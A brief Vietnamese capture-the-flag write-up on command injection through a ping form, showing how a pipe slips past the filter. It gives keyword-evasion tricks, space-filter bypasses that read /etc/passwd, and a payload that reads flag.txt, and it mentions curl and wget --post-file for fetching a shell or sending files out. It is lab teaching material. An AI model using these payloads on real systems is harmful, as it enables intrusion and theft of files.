Web có chức năng ping đến 1 IP được nhập vào và hiện thị kết quả:

![image](https://user-images.githubusercontent.com/92881216/233627651-f7ec05fc-2c1e-4874-95db-ccb1b8d13cd2.png)

Khi nhập `127.0.0.1` :

![image](https://user-images.githubusercontent.com/92881216/233627887-af6925de-17ef-48ea-92c8-72011addb757.png)

Web có filter 1 số thứ:
- Các câu lệnh linux như: `ls`, `cat`, `bash`, `curl`,...
- Một số ký tự như: ` `, `(`, `)`, `&`, `;`,...

Tuy nhiên lại bỏ qua `|` => dễ bị lỗi command injection

Khai thác:

- Bypass các từ bị filter: 
```
w'h'o'am'i  => loại vì ' hay " đều bị filter
``` 

```
w\ho\am\i => ok
```

```
who$@ami  => ok
```

Kết quả: 

![image](https://user-images.githubusercontent.com/92881216/233629074-91e5134c-ed99-4cb8-8bec-d44dc98fa8b0.png)

![image](https://user-images.githubusercontent.com/92881216/233629126-475151d3-adf3-4b2f-ab51-0894cf26d932.png)

Tiếp theo là cần đọc file `flag.txt` nhưng ` `(space) bị filter. Cách bypass:
```
swissky@crashlab:~/Www$ cat</etc/passwd
root:x:0:0:root:/root:/bin/bash
```
Hoặc có thể:
```
swissky@crashlab:~$ cat$IFS/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```
Kết quả:

payload: `|ca\t<flag.txt`

![image](https://user-images.githubusercontent.com/92881216/233629502-e56c3b78-8944-43aa-9414-44a057da6bd3.png)

Ngoài ra có thể khai thác theo hướng khác như: `curl` đến 1 web chứa shell hoặc `wget --post-file` để chuyển nội dung file lên web khác


